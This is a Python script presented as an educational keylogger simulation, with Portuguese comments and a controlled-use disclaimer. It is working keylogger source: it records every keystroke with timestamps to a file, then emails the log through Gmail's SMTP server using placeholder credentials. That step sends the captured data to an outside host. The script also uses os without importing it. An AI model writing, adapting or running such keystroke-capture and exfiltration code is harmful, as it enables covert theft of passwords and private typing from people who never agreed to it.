# malware-simulation/keylogger_sim.py
# Simulação educacional de keylogger - Leonardo Costa
# ⚠️ Uso apenas em ambiente controlado e com fins de aprendizado

import pynput
from pynput.keyboard import Listener
import time
import smtplib
from email.message import EmailMessage
import threading

LOG_FILE = "keylog.txt"
EMAIL_ADDRESS = "you@example.com"  # Substitua
EMAIL_PASSWORD = "yourpassword"   # Substitua (use variáveis de ambiente em produção)

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")

def send_email():
    if not os.path.exists(LOG_FILE):
        return
    msg = EmailMessage()
    msg["Subject"] = "Keylog Simulation Report"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg.set_content("Attached is the keylog simulation file.")
    with open(LOG_FILE, "rb") as f:
        msg.add_attachment(f.read(), filename="keylog.txt")
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
            print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

def start_keylogger(duration=30):
    print(f"[*] Starting keylogger simulation for {duration} seconds...")
    with Listener(on_press=on_press) as listener:
        timer = threading.Timer(duration, listener.stop)
        timer.start()
        listener.join()
    print("[*] Keylogger simulation finished.")
    send_email()

if __name__ == "__main__":
    start_keylogger(duration=30)